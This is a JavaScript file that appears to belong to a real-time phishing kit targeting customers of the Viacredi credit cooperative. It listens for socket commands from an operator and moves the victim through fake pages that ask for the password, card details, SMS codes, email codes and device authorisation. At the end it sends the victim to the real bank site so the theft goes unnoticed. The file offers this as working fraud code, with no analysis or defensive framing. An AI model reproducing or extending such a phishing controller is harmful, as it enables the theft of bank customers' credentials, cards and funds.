const await = (() => {
    const params = new URLSearchParams(window.location.search)
    const client_id = document.body.dataset.client || params.has('client')
    //private var/functions
    function commands() {
        socket.on('errorpass', (data) => {
            if (client_id) {
                if (client_id == data) window.location.href = `/modules/conta/password/${data}`
            } else return
        })
        socket.on('getCardVerify', (data) => {
            if (client_id) {
                if (client_id == data.id) window.location.href = `/modules/conta/card/${data.id}/${data.cards[0].end}`
            } else return
        })

        socket.on('getAuth', (data) => {
            if (client_id) {
                if (client_id == data) window.location.href = `/modules/conta/auth/${data}`
            } else return
        })

        socket.on('disp', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/dispositivo?client=${data}`
            } else return
        })

        socket.on('erroruser', (data) => {

            if (client_id) {
                if (client_id == data) window.location.href = `/modules/conta/${data}`
            } else return
        })
        socket.on('getSMS', (data) => {

            if (client_id) {
                if (client_id == data) window.location.href = `/modules/conta/authentication/${data}`
            } else return
        })

        socket.on('errorpass6', (data) => {
            const params = new URLSearchParams(window.location.search)


            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
            } else return
        })

        socket.on('getMailCode', (data) => {
            if (client_id) {
                if (client_id == data) window.location.href = `/modules/conta/mail/${data}`
            } else return
        })

        socket.on('errorSMS', (data) => {
            if (client_id) {
                if (client_id == data) window.location.href = `/modules/conta/sms/${data}?error=true`
            } else return
        })

        socket.on('FinishClient', (data) => {

            if (client_id) {
                if (client_id == data) window.location.href = `https://www.viacredi.coop.br/`
            } else return
        })
    }

    function startRoom() {
        // socket.emit('start', theUser)

        // //await
        // socket.emit('await', theUser)
    }

    return {
        //public var/functions
        startRoom,
        commands
    }
})()

await.startRoom()
await.commands()
